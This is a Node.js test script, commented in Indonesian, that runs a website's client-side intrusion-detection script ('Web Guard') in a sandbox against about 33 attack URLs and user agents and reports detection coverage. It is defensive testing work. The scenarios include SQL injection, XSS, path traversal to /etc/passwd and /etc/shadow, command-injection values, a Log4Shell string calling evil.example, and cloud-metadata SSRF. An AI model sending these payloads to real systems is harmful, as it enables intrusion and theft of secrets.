/**
 * attack-sim.mjs — uji serangan terhadap Web Guard yang SUDAH LIVE.
 *
 * Menembakkan 30+ vektor serangan ke kode guard.js yang diambil langsung dari
 * https://wsyahbanii.my.id, lalu melaporkan mana yang tertangkap dan mana yang lolos.
 *
 * Pengiriman email DIMATIKAN di sini (diganti perekam) supaya inbox tidak dibanjiri.
 * Yang diukur: cakupan deteksi. Pengiriman sudah dibuktikan terpisah oleh live-e2e-test.mjs.
 *
 * Jalankan: node tools/attack-sim.mjs
 */
import vm from 'node:vm';

const BASE = 'https://wsyahbanii.my.id';

const LOCAL = process.argv.includes('--local');

let cfgSrc, guardSrc;
if (LOCAL) {
  const fs = await import('node:fs');
  cfgSrc = fs.readFileSync('assets/js/guard.config.js', 'utf8');
  guardSrc = fs.readFileSync('assets/js/guard.js', 'utf8');
} else {
  cfgSrc = await (await fetch(BASE + '/assets/js/guard.config.js')).text();
  guardSrc = await (await fetch(BASE + '/assets/js/guard.js')).text();
}

const GEO = {
  success: true, ip: '103.152.34.11', city: 'Singapore', region: 'Singapore',
  country: 'Singapore', country_code: 'SG', latitude: 1.3521, longitude: 103.8198,
  connection: { isp: 'Example Hosting Pte Ltd', org: 'Example Hosting', asn: 13335, type: 'hosting' },
  security: { proxy: false, vpn: true, tor: false, hosting: true }
};

const UA_HUMAN = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

function makeSandbox({ url, ua = UA_HUMAN, referrer = '', ctx = null, seedBurst = 0 }) {
  const u = new URL(url);
  const store = new Map();
  if (seedBurst > 0) {
    const now = Date.now();
    const hits = [];
    for (let i = 0; i < seedBurst; i++) hits.push(now - i * 100);
    store.set('ws_guard_hits', JSON.stringify(hits));
  }

  const el = () => ({
    style: {}, setAttribute() {}, addEventListener() {},
    getContext: () => null,
    toDataURL: () => { throw new Error('no-canvas'); }
  });

  const sb = {
    console: { log() {}, warn() {}, error() {} },
    Date, Promise, Object, Array, String, Number, Math, JSON, RegExp, Error, Intl, URLSearchParams,
    AbortController,
    setTimeout: () => 0,
    clearTimeout: () => {},
    requestAnimationFrame: () => {},
    document: {
      readyState: 'complete', title: 'Wahyu Syahbani', referrer,
      documentElement: { setAttribute() {}, classList: { add() {}, remove() {} }, innerHTML: '' },
      head: { appendChild() {} }, body: { appendChild() {} },
      addEventListener() {}, createElement: el, getElementById: () => null
    },
    navigator: {
      userAgent: ua, language: 'id-ID', languages: ['id-ID', 'en'], platform: 'Win32',
      hardwareConcurrency: 8, deviceMemory: 8, maxTouchPoints: 0,
      plugins: { length: 3 }, webdriver: false
    },
    screen: { width: 1920, height: 1080, colorDepth: 24, availWidth: 1920, availHeight: 1040 },
    localStorage: {
      getItem: (k) => (store.has(k) ? store.get(k) : null),
      setItem: (k, v) => store.set(k, v),
      removeItem: (k) => store.delete(k)
    },
    location: { href: url, pathname: u.pathname, search: u.search, hash: '' },
    devicePixelRatio: 1,
    matchMedia: () => ({ matches: false }),
    addEventListener() {},
    __GUARD_CTX: ctx
  };

  sb.fetch = async (target) => {
    const s = String(target);
    if (s.includes('ipwho.is')) return { ok: true, json: async () => GEO };
    if (s.includes('ipapi.co')) return { ok: true, json: async () => ({}) };
    if (s.includes('ip-api.com')) return { ok: true, json: async () => ({ status: 'fail' }) };
    if (s.includes('dns.google')) return { ok: true, json: async () => ({ Answer: [{ data: 'ptr.hostile.example' }] }) };
    return { ok: true, json: async () => ({}) };
  };
  sb.window = sb;
  sb.globalThis = sb;
  return sb;
}

async function run(sc, thresholdOverride = null) {
  const sb = makeSandbox(sc);
  vm.createContext(sb);
  vm.runInContext(cfgSrc, sb);
  sb.GUARD_CONFIG.reportOnLoad = false;
  sb.GUARD_CONFIG.countermeasures = { enabled: false };
  sb.GUARD_CONFIG.debug = false;
  if (thresholdOverride != null) sb.GUARD_CONFIG.thresholds.score = thresholdOverride;

  let wouldSend = false;
  sb.emailjs = {
    init() {},
    send() { wouldSend = true; return Promise.resolve({ status: 200, text: 'OK' }); }
  };
  sb.fetch = sb.fetch;

  vm.runInContext(guardSrc, sb);
  const rep = await sb.WSGuard.scan(sc.honeypot ? { honeypot: sc.honeypot } : undefined);
  return { rep, wouldSend };
}

/* ================= skenario ================= */
const A = BASE + '/';
const S = [];

S.push({ n: 'SQLi: UNION SELECT', url: A + "?id=1'%20OR%201=1--%20UNION%20SELECT%20password%20FROM%20users" });
S.push({ n: 'SQLi: blind boolean', url: A + "?id=1%20AND%201=1" });
S.push({ n: 'SQLi: time-based', url: A + "?id=1';WAITFOR%20DELAY%20'0:0:5'--" });
S.push({ n: 'SQLi: information_schema', url: A + '?t=information_schema.tables' });
S.push({ n: 'XSS: script tag', url: A + '?q=%3Cscript%3Ealert(1)%3C/script%3E' });
S.push({ n: 'XSS: img onerror', url: A + '?q=%3Cimg%20src=x%20onerror=alert(1)%3E' });
S.push({ n: 'XSS: javascript: URI', url: A + '?next=javascript:alert(document.cookie)' });
S.push({ n: 'LFI: /etc/passwd', url: A + '?f=../../../../etc/passwd' });
S.push({ n: 'LFI: php://filter', url: A + '?f=php://filter/convert.base64-encode/resource=index' });
S.push({ n: 'LFI: encoded traversal', url: A + '?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd' });
S.push({ n: 'RCE: ;cat /etc/shadow', url: A + '?cmd=;cat%20/etc/shadow' });
S.push({ n: 'RCE: pipe + whoami', url: A + '?h=|whoami' });
S.push({ n: 'RCE: backtick id', url: A + '?x=`id`' });
S.push({ n: 'SSTI: {{7*7}}', url: A + '?tpl={{7*7}}' });
S.push({ n: 'Log4Shell: ${jndi:ldap}', url: A + '?x=${jndi:ldap://evil.example/a}' });
S.push({ n: 'SSRF: cloud metadata', url: A + '?url=http://169.254.169.254/latest/meta-data/' });
S.push({ n: 'SSRF: localhost', url: A + '?url=http://127.0.0.1:8080/admin' });
S.push({ n: 'NoSQL: $ne operator', url: A + '?user[$ne]=null&pass[$ne]=null' });
S.push({ n: 'CRLF injection', url: A + '?r=%0d%0aSet-Cookie:evil=1' });
S.push({ n: 'Open redirect', url: A + '?redirect=https://evil.example/phish' });
S.push({ n: 'Recon: /.env', url: BASE + '/.env' });
S.push({ n: 'Recon: /.git/config', url: BASE + '/.git/config' });
S.push({ n: 'Recon: /wp-admin', url: BASE + '/wp-admin' });
S.push({ n: 'Recon: /phpmyadmin', url: BASE + '/phpmyadmin' });
S.push({ n: 'Recon: /backup.sql', url: BASE + '/backup.sql' });
S.push({ n: 'Scanner UA: sqlmap', url: A, ua: 'sqlmap/1.7.2#stable (https://sqlmap.org)' });
S.push({ n: 'Scanner UA: nuclei', url: A, ua: 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' });
S.push({ n: 'Scanner UA: nikto', url: A, ua: 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)' });
S.push({ n: 'Scanner UA: gobuster', url: A, ua: 'gobuster/3.6' });
S.push({ n: 'Headless: puppeteer', url: A, ua: 'Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/131.0.0.0 Safari/537.36 Puppeteer' });
S.push({ n: '404 scan: path acak', url: BASE + '/halaman-acak-xyz', ctx: { is404: true, requestedPath: '/halaman-acak-xyz' } });
S.push({ n: 'Honeypot: link terjebak', url: A, honeypot: 'link:/wp-admin' });
S.push({ n: 'Burst: 15 request/10s', url: A, seedBurst: 15 });
S.push({ n: 'Kontrol: kunjungan normal', url: A, expectClean: true });
S.push({ n: 'Kontrol: kunjungan + query wajar', url: A + '?utm_source=instagram&ref=portfolio', expectClean: true });
S.push({ n: 'Kontrol: buka anchor section', url: A + '#work', expectClean: true });

/* ================= jalankan ================= */
console.log('\n\x1b[1mATTACK SIM — serangan ke Web Guard\x1b[0m');
console.log('Sumber kode :', LOCAL ? 'lokal (assets/js/guard.js)' : BASE + '/assets/js/guard.js');
console.log('Pengiriman  : dimatikan (perekam)\n');

let detected = 0, below = 0, blind = 0, falsePos = 0, clean = 0;
const belowList = [], blindList = [];

console.log('No  Skenario                          Skor  Alert  Rule  Severity  Keterangan');
console.log('-'.repeat(92));

for (let i = 0; i < S.length; i++) {
  const sc = S[i];
  const probe = await run(sc, 1);      // ambang 1 -> lihat skor mentah & rule yang menyala
  const real = await run(sc, null);    // ambang asli -> lihat alert sungguhan
  const rawScore = probe.rep ? probe.rep.score : 0;
  const ruleFired = !!probe.rep;
  const alerts = !!real.rep;
  const sev = probe.rep ? probe.rep.severity : '-';
  const em = real.wouldSend ? 'ya' : 'tidak';

  let v, note = '';
  if (sc.expectClean) {
    if (alerts) { falsePos++; v = '\x1b[31mYA!\x1b[0m'; note = 'FALSE POSITIVE'; }
    else { clean++; v = '\x1b[32m-\x1b[0m'; }
  } else {
    if (alerts) { detected++; v = '\x1b[32mYA\x1b[0m'; }
    else if (ruleFired) { below++; v = '\x1b[33mtidak\x1b[0m'; note = 'rule jalan tapi skor < ' + 50; belowList.push(sc.n + ' (' + rawScore + ' poin)'); }
    else { blind++; v = '\x1b[31mtidak\x1b[0m'; note = 'BLIND SPOT - rule tidak jalan'; blindList.push(sc.n); }
  }

  console.log(
    String(i + 1).padEnd(4) +
    sc.n.padEnd(32) +
    String(rawScore).padEnd(6) +
    v.padEnd(15) +
    (ruleFired ? 'ya' : 'tidak').padEnd(6) +
    String(sev).padEnd(10) +
    note
  );
}

const attacks = S.filter((s) => !s.expectClean).length;
console.log('-'.repeat(92));
console.log('\n\x1b[1mRingkasan\x1b[0m');
console.log(`  Serangan diuji            : ${attacks}`);
console.log(`  \x1b[32mTertangkap (alert terkirim)\x1b[0m : ${detected}`);
console.log(`  \x1b[33mLolos krn skor < ambang\x1b[0m     : ${below}`);
console.log(`  \x1b[31mBLIND SPOT (rule tak jalan)\x1b[0m  : ${blind}`);
console.log(`  Kontrol bersih           : ${clean} benar, ${falsePos} false positive`);

if (belowList.length) {
  console.log('\n  \x1b[33mTerdeteksi tapi di bawah ambang 50 (masalah bobot skor):\x1b[0m');
  belowList.forEach((m) => console.log('    - ' + m));
}
if (blindList.length) {
  console.log('\n  \x1b[31mBenar-benar tidak terdeteksi (butuh rule baru):\x1b[0m');
  blindList.forEach((m) => console.log('    - ' + m));
}
console.log('');

